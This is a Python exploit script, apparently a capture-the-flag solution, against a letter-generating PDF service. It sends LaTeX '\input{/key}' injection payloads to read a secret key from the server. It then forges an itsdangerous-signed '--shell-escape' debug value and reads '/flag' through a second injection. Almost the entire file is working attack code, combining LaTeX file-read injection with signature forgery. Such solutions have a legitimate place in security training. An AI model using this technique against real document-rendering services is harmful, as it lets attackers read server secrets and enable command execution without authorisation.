import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import io
import fitz
import re
from itsdangerous import Signer

BASE_URL = "https://letters.quoccacorp.com"
DATE_PATTERN = r"\b[A-Za-z]+ \d{1,2}, \d{4}\b"
# Verbatim payloads must contain 1 \
PAYLOAD_KEY = "\\input{/key}"
PAYLOAD_FLAG = "\\input{/flag}"

class Solver:
    def __init__(self):
        self.session = get_session()

    def get_pdf_letter_text(self, response) -> str:
        pdf_doc = fitz.open(stream=io.BytesIO(response.content), filetype="pdf")
        pdf_text = "\n".join(page.get_text() for page in pdf_doc)
        pdf_doc.close()
        return pdf_text

    def get_pdf_letter_body_text(self, response) -> str:
        pdf_text = self.get_pdf_letter_text(response)
        if date_match := re.search(DATE_PATTERN, pdf_text):
            start_index = date_match.end()
            end_index = pdf_text.find("Sincerely,")
            body_text = pdf_text[start_index:end_index].strip()
            return body_text
        else:
            return None

    def main(self):
        response = self.session.post(f"{BASE_URL}/letter.pdf", data={"text": PAYLOAD_KEY})
        secret_key = self.get_pdf_letter_body_text(response)
        signer = Signer(secret_key)
        signed_debug_key = signer.sign("--shell-escape").decode()

        response = self.session.post(f"{BASE_URL}/letter.pdf", data={"text": PAYLOAD_FLAG, "debug": signed_debug_key})
        flag = self.get_pdf_letter_body_text(response)
        find_flag(flag)

if __name__ == "__main__":
    Solver().main()